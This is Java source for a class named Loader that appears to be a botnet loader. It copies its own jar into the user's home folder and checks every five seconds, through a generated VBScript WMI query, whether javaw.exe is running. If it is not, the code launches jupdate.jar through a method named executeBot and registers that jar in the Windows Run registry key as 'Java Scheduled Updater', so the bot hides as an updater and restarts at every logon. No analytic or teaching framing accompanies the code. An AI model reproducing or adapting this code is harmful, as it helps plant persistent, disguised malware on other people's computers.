
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;


/**
 *
 * @author Kenta IWasaki
 */
public class Loader {
    public static Loader instance;

    public static Loader getInstance() {
        if (instance == null) instance = new Loader();
        return instance;
    }

    public static void main(String[] args) {
        while (true) {
            try {
                if (!new File(System.getProperty("user.home") + "\\" + "\\jloader.jar").exists()) {
                    getInstance().copyFile(instance.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().toString().replace("file:/", ""), System.getProperty("user.home") + "\\jloader.jar");
                }
                if (!getInstance().isRunning("javaw.exe")) {
                    getInstance().executeBot();
                }
                Thread.sleep(5000); // Sleep for 5 seconds to prevent lag
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private void copyFile(String srFile, String dtFile) {
        try {
            File f1 = new File(srFile);
            File f2 = new File(dtFile);
            InputStream inz = new FileInputStream(f1);
            OutputStream outz = new FileOutputStream(f2);
            byte[] buf = new byte[1024];
            int len;
            while ((len = inz.read(buf)) > 0) {
                outz.write(buf, 0, len);
            }
            inz.close();
            outz.close();
        } catch (Exception e) {
        }
    }

    public void executeBot() {
        try {
            Runtime.getRuntime().exec(System.getProperty("user.home")+"\\" + "\\jupdate.jar");
            RegistryUtils.writeStringValue(RegistryUtils.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Scheduled Updater", "\"" + System.getProperty("user.home") + "\\jupdate.jar" + "\"");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public boolean isRunning(String process) {
        boolean found = false;
        try {
            File file = File.createTempFile("process_check", ".vbs");
            file.deleteOnExit();
            FileWriter fw = new java.io.FileWriter(file);

            String vbs = "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n"
                    + "Set locator = CreateObject(\"WbemScripting.SWbemLocator\")\n"
                    + "Set service = locator.ConnectServer()\n"
                    + "Set processes = service.ExecQuery _\n"
                    + " (\"select * from Win32_Process where name='" + process + "'\")\n"
                    + "For Each process in processes\n"
                    + "wscript.echo process.Name \n"
                    + "Next\n"
                    + "Set WSHShell = Nothing\n";

            fw.write(vbs);
            fw.close();
            Process p = Runtime.getRuntime().exec("cscript //NoLogo " + file.getPath());
            BufferedReader input =
                    new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            line = input.readLine();
            if (line != null) {
                if (line.equals(process)) {
                    found = true;
                }
            }
            input.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return found;
    }
}
